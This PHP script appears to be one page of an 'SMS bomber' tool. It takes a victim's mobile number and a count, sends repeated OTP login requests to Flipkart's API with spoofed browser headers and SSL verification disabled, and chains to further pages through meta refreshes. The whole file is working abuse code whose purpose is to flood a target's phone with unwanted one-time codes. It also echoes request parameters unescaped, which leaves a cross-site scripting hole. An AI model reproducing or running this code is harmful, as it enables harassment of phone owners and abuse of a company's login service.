
<?php 
$count=$_REQUEST['count'];
$sent=$_REQUEST['sent'];
$mobno=$_REQUEST['mobno'];
if($sent==$count){	
	header("location:index.php?msg=total ".$count." otp send successuffly");
}
else{ 
	
 $data='{"actionRequestContext":{"type":"LOGIN_IDENTITY_VERIFY","loginIdPrefix":"+91","loginId":"'.$mobno.'","clientQueryParamMap":{"ret":"/rv/accounts"},"loginType":"MOBILE","verificationType":"OTP","screenName":"LOGIN_V4_MOBILE","sourceContext":"DEFAULT"}}';
 $url="https://1.rome.api.flipkart.com/1/action/view";
         //header here
         $headers   = array();
        $headers[] = "Host:1.rome.api.flipkart.com";
        $headers[] = "Connection:keep-alive";
        $headers[] = "Content-Length:250";
        $headers[] = "X-user-agent:Mozilla/5.0 (Linux; Android 9; Mi A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36FKUA/msite/0.0.3/msite/Mobile";
        $headers[] = "User-Agent:Mozilla/5.0 (Linux; Android 9; Mi A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36";
        $headers[] = "Content-Type:application/json";
        $headers[] = "Accept:*/*";
        $headers[] = "Origin:https://www.flipkart.com";
        $headers[] = "Sec-Fetch-Site:same-site";
        $headers[] = "Sec-Fetch-Mode:cors";
        $headers[] = "Sec-Fetch-Dest:empty";
        $headers[] = "referer:https://www.flipkart.com/login?ret=%2Frv%2Faccounts";
        $headers[] = "Accept-Encoding:gzip, deflate, br";
        $headers[] = "Accept-Language:en-US,en;q=0.9";
        
      //  $headers[] = "";

        //end headers and function start
         $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST,0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,0);
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION,0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        
        $result = curl_exec($ch);
        curl_close($ch);
    



	$sentinc=$sent+1;
   $rl="16.php?sent=".$sentinc."&&count=".$count."&&mobno=".$mobno;
   ?><center><div style="height: 50px;width: 40rem;border-radius:20px;background:#00F306;color: black;font-size: 32px;border:2px dotted red;padding-top: 8px;font-family: Yu Gothic;"> <?php echo $sent; ?> OTP SEND AND CONTINUE....</div></center><?php
	echo '<META HTTP-EQUIV=REFRESH CONTENT="2; '.$rl.'">';
	//header("location:2.php?sent=".$sentinc."&&count=".$count."&&mobno=".$mobno);
}
?>